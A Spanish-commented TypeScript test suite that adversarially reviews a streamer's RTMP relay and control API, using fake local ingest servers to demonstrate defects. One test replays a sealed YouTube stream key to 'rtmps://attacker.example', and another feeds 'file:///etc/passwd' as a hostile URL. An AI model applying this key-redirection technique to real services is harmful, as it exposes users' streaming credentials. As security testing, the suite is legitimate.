/**
 * EQ6b · Revisión adversarial del PR #227 (streamer: relé RTMP + API de control).
 *
 * NO es una suite del autor: son pruebas de ROTURA. Las marcadas `DEFECTO` están
 * en rojo contra eb0f858 a propósito (cada una demuestra un hallazgo del informe);
 * las marcadas `CONTROL` son los ataques que la entrega resiste y deben seguir
 * verdes. Servidores RTMP falsos en proceso (127.0.0.1, puerto efímero); nada
 * sale a la red.
 */
import { createHmac, generateKeyPairSync, randomBytes } from "node:crypto";
import { spawn } from "node:child_process";
import { mkdtempSync, writeFileSync, chmodSync, mkdirSync, symlinkSync, linkSync, utimesSync, existsSync, readFileSync } from "node:fs";
import { createServer, connect as netConnect, type Server, type Socket } from "node:net";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { decodeAmf0Values, encodeAmf0Values } from "./rtmp/amf0.js";
import { ChunkReader, encodeMessage, MSG_COMMAND_AMF0, MSG_SET_CHUNK_SIZE, type RtmpMessage } from "./rtmp/chunk.js";
import { parseIngestUrl, RtmpPublisher, type IngestTarget } from "./rtmp/publisher.js";
import { createControlServer } from "./control.js";
import { StreamSupervisor, type SpawnedProcess } from "./supervisor.js";
import { createLogger, DEFAULT_CONFIG } from "./config.js";
import { applyRetention } from "./recordings.js";
import { sealSecret } from "../../../packages/stream-secrets/index.js";
import { EventEmitter } from "node:events";

const servers: Server[] = [];
const sockets: Socket[] = [];
afterEach(async () => {
  for (const s of sockets.splice(0)) s.destroy();
  await Promise.all(servers.splice(0).map((s) => new Promise((r) => s.close(r))));
});

type Behaviour = "silent_after_handshake" | "normal" | "stall_reads_after_publish" | "reject_publish" | "reject_connect";

/** Ingesta RTMP falsa. Registra el nombre de stream (la CLAVE) de cada publish. */
async function fakeIngest(behaviour: Behaviour) {
  const seen = { published: [] as string[], connects: 0 };
  const server = createServer((sock) => {
    sockets.push(sock);
    sock.on("error", () => {});
    let buf = Buffer.alloc(0);
    let phase: "c0c1" | "c2" | "chunks" = "c0c1";
    const s1 = randomBytes(1536);
    const reader = new ChunkReader();
    const send = (m: RtmpMessage) => sock.write(encodeMessage(m, 128));
    const reply = (name: string, txn: number, args: unknown[], streamId = 0) =>
      send({ csid: 3, type: MSG_COMMAND_AMF0, streamId, timestamp: 0, payload: encodeAmf0Values([name, txn, ...(args as never[])]) });
    sock.on("data", (d: Buffer) => {
      buf = Buffer.concat([buf, d]);
      if (phase === "c0c1") {
        if (buf.length < 1537) return;
        sock.write(Buffer.concat([Buffer.from([3]), s1, buf.subarray(1, 1537)]));
        buf = buf.subarray(1537);
        phase = "c2";
      }
      if (phase === "c2") {
        if (buf.length < 1536) return;
        buf = buf.subarray(1536);
        phase = "chunks";
      }
      if (phase === "chunks" && buf.length) {
        const msgs = reader.push(buf);
        buf = Buffer.alloc(0);
        for (const m of msgs) {
          if (m.type === MSG_SET_CHUNK_SIZE) continue;
          if (m.type !== MSG_COMMAND_AMF0) continue;
          const v = decodeAmf0Values(m.payload);
          const name = String(v[0]);
          const txn = Number(v[1]);
          if (name === "connect") seen.connects++;
          if (behaviour === "silent_after_handshake") continue; // acepta TLS+handshake y calla
          if (name === "connect" && behaviour === "reject_connect") {
            reply("_error", txn, [null, { level: "error", code: "NetConnection.Connect.Rejected", description: "app no válida" }]);
            continue;
          }
          if (name === "publish" && behaviour === "reject_publish") {
            // Clave errónea/caducada: rechazo explícito SIN cerrar el socket (Wowza y otros).
            reply("onStatus", 0, [null, { level: "error", code: "NetStream.Publish.BadName", description: "invalid stream key" }], 1);
            continue;
          }
          if (name === "connect") reply("_result", txn, [{}, { code: "NetConnection.Connect.Success" }]);
          if (name === "createStream") reply("_result", txn, [null, 1]);
          if (name === "publish") {
            seen.published.push(String(v[3]));
            reply("onStatus", 0, [null, { level: "status", code: "NetStream.Publish.Start", description: "ok" }], 1);
            if (behaviour === "stall_reads_after_publish") sock.pause();
          }
        }
      }
    });
  });
  servers.push(server);
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const port = (server.address() as AddressInfo).port;
  const dial = (_t: IngestTarget) => netConnect({ host: "127.0.0.1", port });
  return { seen, dial, port };
}

function flvHeader(): Buffer {
  const h = Buffer.from([0x46, 0x4c, 0x56, 1, 5, 0, 0, 0, 9, 0, 0, 0, 0]);
  return h;
}
function flvTag(type: number, ts: number, size: number): Buffer {
  const b = Buffer.alloc(11 + size + 4);
  b[0] = type;
  b.writeUIntBE(size, 1, 3);
  b.writeUIntBE(ts & 0xffffff, 4, 3);
  b[7] = (ts >>> 24) & 0xff;
  b.writeUInt32BE(11 + size, 11 + size);
  return b;
}

const withTimeout = <T>(p: Promise<T>, ms: number) =>
  Promise.race([p.then((v) => ({ settled: true as const, v })), new Promise<{ settled: false }>((r) => setTimeout(() => r({ settled: false }), ms))]);

describe("EQ6b · relé RTMP frente a una ingesta que responde mal", () => {
  it("DEFECTO P2 · probe(): una ingesta que completa el handshake y no contesta a `connect` cuelga la prueba para siempre (sin timeout tras el handshake)", async () => {
    const ing = await fakeIngest("silent_after_handshake");
    const pub = new RtmpPublisher({
      target: parseIngestUrl("rtmps://ingest.example/live2"),
      streamKey: "k".repeat(16),
      dial: ing.dial,
      connectTimeoutMs: 300,
    });
    // connectTimeoutMs = 300 ms: con 3 s de margen la promesa DEBE haberse resuelto o rechazado.
    const r = await withTimeout(pub.probe().catch((e) => e), 3000);
    pub.close();
    expect(ing.seen.connects).toBe(1); // el servidor recibió connect: la prueba no es trivial
    expect(r.settled).toBe(true);
  });

  it("DEFECTO P2 · start(): con la ingesta muda tras el handshake, el relé pausa a ffmpeg en 4 MiB y NUNCA falla (ni reintento ni error)", async () => {
    const ing = await fakeIngest("silent_after_handshake");
    const pub = new RtmpPublisher({
      target: parseIngestUrl("rtmps://ingest.example/live2"),
      streamKey: "k".repeat(16),
      dial: ing.dial,
      connectTimeoutMs: 300,
    });
    let failed = false;
    pub.on("error", () => (failed = true));
    void pub.start().catch(() => (failed = true));
    // Lo que hace el supervisor: escribir hasta que writeFlv diga «para» y esperar 'drain'.
    let accepting = pub.writeFlv(flvHeader());
    let ts = 0;
    while (accepting) accepting = pub.writeFlv(flvTag(9, (ts += 33), 256 * 1024));
    await new Promise((r) => setTimeout(r, 2500));
    const stuck = !failed && pub.state !== "closed";
    pub.close();
    // Un publicador que ni publica ni falla deja la emisión en `streaming` sin reintento.
    expect(stuck).toBe(false);
  });

  it("DEFECTO P3 · ChunkReader: el tope de 1 MiB es POR MENSAJE; mensajes a medias en muchos csid acumulan memoria sin límite", () => {
    const r = new ChunkReader();
    r.setChunkSize(64 * 1024);
    const LEN = 1024 * 1024; // justo el tope admitido por mensaje
    let aggregated = 0;
    let threw = false;
    try {
      for (let csid = 64; csid < 64 + 64; csid++) {
        // Cabecera tipo 0 con csid de 2 bytes y UN chunk de 64 KiB: el mensaje queda a medias.
        const h = Buffer.alloc(2 + 11);
        h[0] = 0; // fmt 0, csid 0 ⇒ csid = 64 + h[1]
        h[1] = csid - 64;
        h.writeUIntBE(0, 2, 3);
        h.writeUIntBE(LEN, 5, 3);
        h[8] = 20;
        h.writeUInt32LE(0, 9);
        r.push(Buffer.concat([h, Buffer.alloc(64 * 1024)]));
        aggregated += 64 * 1024;
      }
      // Cada csid puede seguir creciendo hasta 1 MiB: 65 536 csid × 1 MiB = 64 GiB.
    } catch {
      threw = true;
    }
    // Con un tope agregado (p. ej. 2 MiB de mensajes entrantes a medias) esto lanza.
    expect(threw || aggregated <= 2 * 1024 * 1024).toBe(true);
  });

  it("CONTROL · parseIngestUrl: file:, rtmp:// sin TLS, credenciales y query se rechazan", () => {
    for (const u of [
      "file:///etc/passwd",
      "rtmp://a.rtmps.youtube.com/live2",
      "rtmps://u:p@host/live2",
      "rtmps://host/live2?x=1",
      "rtmps://host/",
      "http://host/live2",
    ]) {
      expect(() => parseIngestUrl(u), u).toThrow();
    }
  });
});

// ── API interna de control ─────────────────────────────────────────────────
const { publicKey: PUB, privateKey: PRIV } = generateKeyPairSync("rsa", {
  modulusLength: 3072,
  publicKeyEncoding: { type: "spki", format: "pem" },
  privateKeyEncoding: { type: "pkcs8", format: "pem" },
});

class FakeChild extends EventEmitter implements SpawnedProcess {
  stdout = new EventEmitter();
  stderr = new EventEmitter();
  stdio = [null, null, null, Object.assign(new EventEmitter(), { pause() {}, resume() {} })] as unknown as ArrayLike<unknown>;
  kill() {
    return true;
  }
}

async function controlWith(ingestDial: (t: IngestTarget) => import("node:stream").Duplex, controlSecret: string | null) {
  const logger = createLogger(null, () => {});
  const sup = new StreamSupervisor({
    config: { ...DEFAULT_CONFIG, retryDelayMs: 10 },
    spawner: () => new FakeChild(),
    logger,
    dial: ingestDial,
  });
  const server = createControlServer({
    supervisor: sup,
    config: DEFAULT_CONFIG,
    logger,
    capabilities: { nvenc: false },
    controlSecret,
    readPrivateKey: () => PRIV,
    readLegacyKey: () => null,
  });
  servers.push(server as unknown as Server);
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  return { sup, base };
}

describe("EQ6b · supervisor ante un rechazo explícito de la ingesta", () => {
  for (const behaviour of ["reject_publish", "reject_connect"] as const) {
    it(`DEFECTO P1 · ${behaviour}: el rechazo (clave errónea / app rechazada) NO llega al supervisor: queda «streaming», 0 reintentos y sin lastError`, async () => {
      const ing = await fakeIngest(behaviour);
      const logger = createLogger(null, () => {});
      const sup = new StreamSupervisor({
        config: { ...DEFAULT_CONFIG, retryDelayMs: 10, maxRetries: 2 },
        spawner: () => new FakeChild(),
        logger,
        dial: ing.dial,
        streamKey: "clave-erronea-123456",
      });
      sup.start();
      await new Promise((r) => setTimeout(r, 1000));
      const view = { state: sup.state, restarts: sup.restarts, lastError: sup.lastError?.message ?? null, relay: sup.relayState };
      sup.stop();
      expect(ing.seen.connects).toBeGreaterThan(0); // la orden llegó a la ingesta
      // Lo exigible: el rechazo se ve (lastError) y se reintenta o se da por fallida.
      expect(view.lastError, JSON.stringify(view)).not.toBeNull();
      expect(view.restarts, JSON.stringify(view)).toBeGreaterThan(0);
    });
  }
});

describe("EQ6b · API interna de control del streamer", () => {
  it("DEFECTO P2 · el sobre sellado NO está atado a su destino: con el secreto interno se reenvía la clave de YouTube a una ingesta arbitraria", async () => {
    const youtubeKey = `yt-${randomBytes(12).toString("hex")}`;
    // Lo que la API guarda en la BD para la plataforma youtube (mismo sealSecret).
    const sealedForYoutube = sealSecret(youtubeKey, PUB);
    const evil = await fakeIngest("normal");
    const secret = randomBytes(24).toString("hex");
    const { sup, base } = await controlWith(evil.dial, secret);
    // Quien tenga la BD (sobre) y el secreto x-streamer-auth —p. ej. la API comprometida,
    // que monta ambos— pide arrancar contra SU servidor con el sobre de YouTube.
    const res = await fetch(`${base}/control/start`, {
      method: "POST",
      headers: { "content-type": "application/json", "x-streamer-auth": secret },
      body: JSON.stringify({ sessionId: "s1", mode: "rtmps", ingestUrl: "rtmps://attacker.example/live2", credential: sealedForYoutube }),
    });
    await new Promise((r) => setTimeout(r, 800));
    sup.stop();
    // La ingesta ajena NO debe recibir la clave de YouTube (y el streamer debería rechazar la orden).
    expect(evil.seen.published).not.toContain(youtubeKey);
    expect(res.status).toBeGreaterThanOrEqual(400);
  });

  it("CONTROL · con secreto configurado: sin cabecera o con cabecera errónea ⇒ 401 en /status, /control/* y /recordings*", async () => {
    const secret = randomBytes(24).toString("hex");
    const { base } = await controlWith((() => {
      throw new Error("no debe marcar");
    }) as never, secret);
    for (const [m, p] of [
      ["GET", "/status"],
      ["GET", "/recordings"],
      ["POST", "/control/start"],
      ["POST", "/control/stop"],
      ["POST", "/control/test"],
      ["POST", "/recordings/retention"],
    ] as const) {
      // (Un espacio final NO sirve de caso: HTTP recorta el OWS de los valores de cabecera.)
      const wrong = secret.slice(0, -1) + (secret.endsWith("0") ? "1" : "0");
      for (const h of [{}, { "x-streamer-auth": "x" }, { "x-streamer-auth": wrong }, { "x-streamer-auth": secret + secret }]) {
        const r = await fetch(`${base}${p}`, { method: m, headers: h as Record<string, string>, body: m === "POST" ? "{}" : undefined });
        expect(r.status, `${m} ${p} ${JSON.stringify(h)}`).toBe(401);
      }
    }
    // /metrics, /healthz, /version abiertos y SIN material sensible.
    const metrics = await (await fetch(`${base}/metrics`)).text();
    expect(metrics).not.toMatch(/rtmps?:\/\//);
  });

  it("DEFECTO P2 · fail-open: si STREAMER_CONTROL_SECRET_FILE está definido pero no se puede leer, el control queda ABIERTO (sólo un warn)", async () => {
    const dir = mkdtempSync(join(tmpdir(), "eq6b-"));
    const secretFile = join(dir, "streamer_control_secret.txt");
    writeFileSync(secretFile, randomBytes(24).toString("hex"), { mode: 0o600 });
    chmodSync(secretFile, 0o000); // EACCES: lo que pasa con un owner equivocado (init-secrets.sh, chown || true)
    const port = 20000 + Math.floor(Math.random() * 20000);
    const child = spawn(process.execPath, ["--import", "tsx", "apps/streamer/src/main.ts"], {
      env: {
        PATH: process.env.PATH ?? "",
        STREAMER_CONTROL_PORT: String(port),
        STREAMER_CONTROL_SECRET_FILE: secretFile,
        FFMPEG_BIN: "/nonexistent-ffmpeg",
        CHROMIUM_BIN: "/nonexistent-chromium",
      },
      stdio: ["ignore", "pipe", "pipe"],
    });
    try {
      let status = 0;
      for (let i = 0; i < 80 && !status; i++) {
        await new Promise((r) => setTimeout(r, 150));
        try {
          status = (await fetch(`http://127.0.0.1:${port}/status`)).status;
        } catch {
          /* aún arrancando */
        }
      }
      expect(status).not.toBe(0); // el proceso arrancó y respondió (control positivo de la prueba)
      // Sin cabecera, un contenedor vecino de la red `platform` no debería leer ni mandar nada.
      expect(status).toBe(401);
    } finally {
      child.kill("SIGKILL");
    }
  }, 20_000);
});

describe("EQ6b · llenar el disco: la retención no toca lo que no debe", () => {
  it("CONTROL · tamaño máximo mínimo (1 MiB) y edad 1 día: borra sólo MP4 regulares viejos; nunca el que se graba, ni enlaces, ni directorios, ni replays (tampoco por hardlink)", () => {
    const root = mkdtempSync(join(tmpdir(), "eq6b-ret-"));
    const video = join(root, "video");
    mkdirSync(video);
    const replay = join(root, "battle-1.replay");
    writeFileSync(replay, Buffer.alloc(4096, 1));
    const old = Date.now() / 1000 - 40 * 86400;
    const mk = (name: string, size: number) => {
      const f = join(video, name);
      writeFileSync(f, Buffer.alloc(size));
      utimesSync(f, old, old);
      return f;
    };
    const victim = mk("broadcast-2026-01-01T00-00-00-000Z.mp4", 2 * 1024 * 1024);
    const current = mk("broadcast-2026-01-02T00-00-00-000Z.mp4", 8 * 1024 * 1024); // en curso y ENORME
    symlinkSync(replay, join(video, "broadcast-2026-01-03T00-00-00-000Z.mp4"));
    linkSync(replay, join(video, "broadcast-2026-01-04T00-00-00-000Z.mp4")); // hardlink a un replay
    mkdirSync(join(video, "broadcast-2026-01-05T00-00-00-000Z.mp4"));
    writeFileSync(join(video, "broadcast-2026-01-05T00-00-00-000Z.mp4", "dentro.replay"), "x");
    mk("broadcast-evil.mp4", 4096);
    mk("../../x.mp4".replace(/[./]/g, "_"), 4096);
    const r = applyRetention(video, { maxAgeDays: 1, maxTotalBytes: 1024 * 1024 }, current);
    const deleted = r.deleted.map((d) => d.name).sort();
    expect(existsSync(current)).toBe(true);
    expect(existsSync(replay)).toBe(true);
    expect(readFileSync(replay).length).toBe(4096);
    expect(existsSync(join(video, "broadcast-2026-01-05T00-00-00-000Z.mp4", "dentro.replay"))).toBe(true);
    expect(existsSync(join(video, "broadcast-evil.mp4"))).toBe(true);
    expect(existsSync(victim)).toBe(false);
    // El hardlink es un fichero regular con nombre de grabación: puede borrarse (sólo el enlace);
    // lo que importa es que el replay sigue intacto (comprobado arriba).
    expect(deleted.every((n) => /^broadcast-2026-01-0[14]T/.test(n))).toBe(true);
  });
});

describe("EQ6b · restart loop", () => {
  it("CONTROL · ffmpeg que muere al instante sin progreso: reintentos acotados (maxRetries) y estado terminal `failed`", async () => {
    let spawned = 0;
    const logger = createLogger(null, () => {});
    const sup = new StreamSupervisor({
      config: { ...DEFAULT_CONFIG, mode: "record", retryDelayMs: 1, maxRetries: 4 },
      spawner: (cmd) => {
        spawned++;
        const c = new FakeChild();
        if (!cmd.includes("chromium")) setTimeout(() => c.emit("exit", 1), 1);
        return c;
      },
      logger,
      sleep: (ms) => new Promise((r) => setTimeout(r, ms)),
    });
    sup.start();
    await new Promise((r) => setTimeout(r, 400));
    expect(sup.state).toBe("failed");
    expect(sup.restarts).toBe(5);
    const before = spawned;
    await new Promise((r) => setTimeout(r, 200));
    expect(spawned).toBe(before); // nada sigue relanzando
  });
});
